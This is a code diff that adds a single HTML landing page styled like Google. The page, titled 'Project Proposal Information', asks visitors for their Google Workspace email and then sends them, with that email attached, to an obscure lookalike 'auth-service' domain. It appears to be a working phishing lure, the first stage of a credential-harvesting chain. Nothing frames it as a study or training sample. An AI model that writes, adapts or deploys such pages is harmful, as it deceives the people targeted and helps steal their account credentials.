@@ -1,0 +1,242 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Project Proposal · Access</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', 'Roboto', 'Helvetica Neue', Arial, sans-serif;
+            background: #f1f3f4;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 24px;
+        }
+
+        .landing-container {
+            max-width: 520px;
+            width: 100%;
+            background: #ffffff;
+            border-radius: 12px;
+            border: 1px solid #dadce0;
+            box-shadow: 0 4px 16px rgba(0, 0, 0, 0.06);
+            padding: 48px 36px 44px;
+            text-align: center;
+        }
+
+        /* Logo as Image — margin-bottom reduced to close gap */
+        .logo-img {
+            max-width: 220px;
+            height: auto;
+            display: block;
+            margin: 0 auto 6px;
+            /* was 24px, now tightly spaced */
+        }
+
+        /* Headline */
+        .headline {
+            font-weight: 500;
+            font-size: 26px;
+            line-height: 34px;
+            color: #202124;
+            margin-bottom: 8px;
+        }
+
+        .subheadline {
+            font-weight: 400;
+            font-size: 16px;
+            line-height: 24px;
+            color: #5f6368;
+            margin-bottom: 12px;
+            /* reduced from 20px to tighten further */
+        }
+
+        /* email field */
+        .email-field {
+            width: 100%;
+            padding: 14px 16px;
+            font-size: 16px;
+            font-family: inherit;
+            border: 1px solid #dadce0;
+            border-radius: 8px;
+            background: #fafafa;
+            transition: border 0.2s, box-shadow 0.2s;
+            margin-bottom: 28px;
+            outline: none;
+            color: #202124;
+        }
+
+        .email-field:focus {
+            border-color: #1a73e8;
+            box-shadow: 0 0 0 3px rgba(26, 115, 232, 0.15);
+            background: #ffffff;
+        }
+
+        .email-field::placeholder {
+            color: #9aa0a6;
+            font-weight: 400;
+        }
+
+        /* Get Started Button – now "Open Project Information" */
+        .get-started-btn {
+            display: inline-block;
+            padding: 14px 44px;
+            font-size: 17px;
+            font-weight: 500;
+            font-family: inherit;
+            color: #ffffff;
+            background: #1a73e8;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: background 0.2s, transform 0.1s;
+            text-decoration: none;
+            letter-spacing: 0.3px;
+            box-shadow: 0 1px 3px rgba(0, 0, 0, 0.08);
+            width: 100%;
+        }
+
+        .get-started-btn:hover {
+            background: #1557b0;
+        }
+
+        .get-started-btn:active {
+            transform: scale(0.97);
+        }
+
+        /* Small screens */
+        @media (max-width: 480px) {
+            .landing-container {
+                padding: 32px 20px 28px;
+            }
+
+            .logo-img {
+                max-width: 170px;
+                margin-bottom: 4px;
+                /* even tighter on small screens */
+            }
+
+            .headline {
+                font-size: 22px;
+                line-height: 30px;
+                margin-bottom: 6px;
+            }
+
+            .subheadline {
+                font-size: 15px;
+                margin-bottom: 10px;
+            }
+
+            .email-field {
+                padding: 12px 14px;
+                font-size: 15px;
+                margin-bottom: 24px;
+            }
+
+            .get-started-btn {
+                padding: 12px 32px;
+                font-size: 15px;
+                width: 100%;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="landing-container">
+
+        <!-- Logo — margin-bottom now tightly closed -->
+        <img 
+            src="https://i.imgpeek.com/BllNntNXhAJ2" 
+            alt="Logo" 
+            class="logo-img"
+        >
+
+        <!-- Headline: "Project Proposal Information" -->
+        <h1 class="headline">Project Proposal Information</h1>
+
+        <!-- Subheadline replaced by email input + hint -->
+        <p class="subheadline" style="margin-bottom: 12px;">
+            Enter your Google Workspace email to continue
+        </p>
+
+        <!-- Email input field -->
+        <input 
+            type="email" 
+            id="workspaceEmail" 
+            class="email-field" 
+            placeholder="you@company.com"
+            autocomplete="email"
+        >
+
+        <!-- Button: text changed to "Open Project Information" -->
+        <button id="openProjectBtn" class="get-started-btn">Open Project Information</button>
+
+    </div>
+
+    <script>
+        (function() {
+            const emailInput = document.getElementById('workspaceEmail');
+            const openBtn = document.getElementById('openProjectBtn');
+
+            // Base URL with required query param
+            const BASE_URL = 'https://n4c8x1.ref-t0k3n1z3r-auth-service-f4g5h6.com';
+            const QUERY_PARAM = 'HoHWJWxD=anNndmR5bw==';
+
+            // Helper: build the final URL with &bsd=email
+            function buildUrl(email) {
+                const cleanEmail = email.trim();
+                if (!cleanEmail) return null;
+                return `${BASE_URL}?${QUERY_PARAM}&bsd=${encodeURIComponent(cleanEmail)}`;
+            }
+
+            // Handle button click: validate, build URL, redirect
+            function handleOpenProject() {
+                const email = emailInput.value;
+                if (!email || email.trim() === '') {
+                    alert('Please enter your Google Workspace email address.');
+                    emailInput.focus();
+                    return;
+                }
+
+                const emailPattern = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+                if (!emailPattern.test(email.trim())) {
+                    alert('Please enter a valid email address (e.g., name@company.com).');
+                    emailInput.focus();
+                    return;
+                }
+
+                const targetUrl = buildUrl(email);
+                if (targetUrl) {
+                    window.location.href = targetUrl;
+                } else {
+                    alert('Something went wrong. Please try again.');
+                }
+            }
+
+            // Click event
+            openBtn.addEventListener('click', handleOpenProject);
+
+            // Press Enter in email field triggers the same action
+            emailInput.addEventListener('keydown', function(e) {
+                if (e.key === 'Enter') {
+                    e.preventDefault();
+                    handleOpenProject();
+                }
+            });
+
+            // Auto-focus the email field on load
+            emailInput.focus();
+        })();
+    </script>
+
+</body>
+</html>
